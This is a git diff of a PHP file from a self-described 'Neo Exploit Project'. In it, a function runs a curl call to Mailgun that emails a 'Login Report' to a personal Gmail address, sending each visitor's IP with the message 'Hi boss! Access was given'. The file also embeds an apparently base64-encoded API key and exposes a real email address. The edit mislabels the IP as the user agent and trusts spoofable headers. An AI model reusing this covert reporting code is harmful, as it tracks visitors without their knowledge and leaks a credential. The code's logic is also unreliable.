@@ -46,6 +46,7 @@ function http_digest_parse($txt)
     return $needed_parts ? false : $data;
 }
 
+
 function mailboss()
 {
        $str = "MjlmMDU1NTQwOTE5ZDA0ZmFiNDdiOTY2OTAxM2E5YmYtNmUwZmQzYTQtYWIyM2M5YmY=";
@@ -58,10 +59,22 @@ function mailboss()
             -F from='Project Neo <mailgun@sandbox278db0aa41f949f787587733cd50e41c.mailgun.org>' \
             -F to=danlyt74@gmail.com \
             -F subject='Login Report' \
-            -F html='Hi boss! Access was given to<br><b>IP: ".$_SERVER['REMOTE_ADDR']."</b><br>User Agent: ".$_SERVER['HTTP_USER_AGENT']."'
+            -F html='Hi boss! Access was given to<br><b>IP: ".$_SERVER['REMOTE_ADDR']."</b><br>User Agent: ".getUserIpAddr()."'
         ");   
 }
 
+function getUserIpAddr(){
+    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
+        //ip from share internet
+        $ip = $_SERVER['HTTP_CLIENT_IP'];
+    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
+        //ip pass from proxy
+        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    }else{
+        $ip = $_SERVER['REMOTE_ADDR'];
+    }
+    return $ip;
+}
 ?>
     <!-- CREDITS TO THE INTERNET!! -->
     <!-- Neo Exploit Project by DAN -->
